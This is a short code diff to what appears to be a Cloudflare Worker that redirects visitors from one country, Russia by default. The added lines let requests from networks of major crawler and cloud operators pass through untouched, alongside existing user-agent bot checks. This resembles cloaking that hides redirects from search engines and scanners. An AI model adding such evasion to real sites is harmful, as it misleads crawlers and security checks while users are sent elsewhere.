@@ -1,4 +1,5 @@
 const BOT_UA = /\b(googlebot|bingbot|yandex(bot|images)|duckduckbot|baiduspider|slurp|mail\.ru_bot|applebot|facebookexternalhit|twitterbot|discordbot|telegrambot)\b/i;
+const BOT_ASN = new Set([15169, 8075, 13238, 32934, 16509, 14618]);
 const MOBILE_UA = /\b(android|iphone|ipod|windows phone|opera mini|opera mobi|blackberry|bb10|silk\/|kindle|webos|iemobile)\b/i;
 
 export default {
@@ -17,6 +18,8 @@ export default {
     }
 
     const country = (request.cf?.country || '').toUpperCase();
+    const asn = request.cf?.asn;
+    if (BOT_ASN.has(Number(asn))) return passthrough(request);
     const target = (env.REDIRECT_COUNTRY || 'RU').toUpperCase();
     if (country !== target) return passthrough(request);
 
